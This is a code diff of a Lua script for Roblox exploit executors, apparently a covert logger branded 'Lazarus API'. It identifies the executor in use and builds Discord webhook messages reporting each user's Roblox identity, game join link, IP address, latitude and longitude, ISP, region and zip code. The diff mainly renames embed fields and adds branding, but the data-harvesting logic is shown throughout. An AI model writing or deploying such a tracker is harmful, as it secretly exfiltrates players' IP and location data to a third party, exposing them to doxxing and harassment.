@@ -3,7 +3,7 @@ do
     --A
     local function checkExploit()
         
-        local exploitName = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        local exploitName = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X 11") or
         (isexecutorclosure and "Script-Ware V2") or
         (secure_load and "Sentinel") or
         (is_sirhurt_closure and "SirHurt V4") or
@@ -49,9 +49,11 @@ do
        
        
             return {
+                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                 ["embeds"] = {
                         {
-                        ["title"] = "Execution Log",
+                        ["title"] = "Lazarus Api",
+                        ["description"] = "Logger for scripts",
                         ['thumbnail'] = {
                             ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                         },
@@ -59,17 +61,22 @@ do
                         ["color"] = 526344,
                         ["fields"] = {
                             {
-                            ["name"] = "Roblox",
-                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUser: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
+                            ["name"] = "User Data",
+                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                            ["name"] = "Personal",
-                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["name"] = "More Info",
+                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
+                            ["name"] = "Lazarus",
+                            ["url"] = "https://www.roblox.com/users/1684020941/profile",
+                            ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/927388572460412958/download.png"
                         },
                         ["footer"] = {
+                            ["text"] = "Logger/Lazarus",
+                            ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/927388572460412958/download.png"
                         },
                         ["timestamp"] = parseDateTime()
                         }
@@ -120,23 +127,27 @@ do
 
             local webhookJson = {
 
+            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
             ["embeds"] = {
                 {
-                ["title"] = "Execution Log",
+                ["title"] = "Lazarus API",
+                ["description"] = "Logger for scripts",
                 ["url"] = "https://www.roblox.com/users/1684020941/profile",
                 ["color"] = 526344,
                 ["fields"] = {
                     {
-                    ["name"] = "Roblox",
+                    ["name"] = "User Data",
                     ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                     }
                 },
                 ["author"] = {
-                    ["name"] = "Execution Log",
+                    ["name"] = "Lazarus",
                     ["url"] = "https://www.roblox.com/users/1684020941/profile",
+                    ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/926570056689807371/download.jpg"
                 },
                 ["footer"] = {
-                    ["text"] = "Execution Log",
+                    ["text"] = "Logger/Lazarus",
+                    ["icon_url"] = "https://cdn.discordapp.com/attachments/919385531018805299/926570056689807371/download.jpg"
                 },
                 ["thumbnail"] = {
                     ["url"] = gameThumb
@@ -165,7 +176,6 @@ do
 
     return skidApi
 end
-
 
 
 
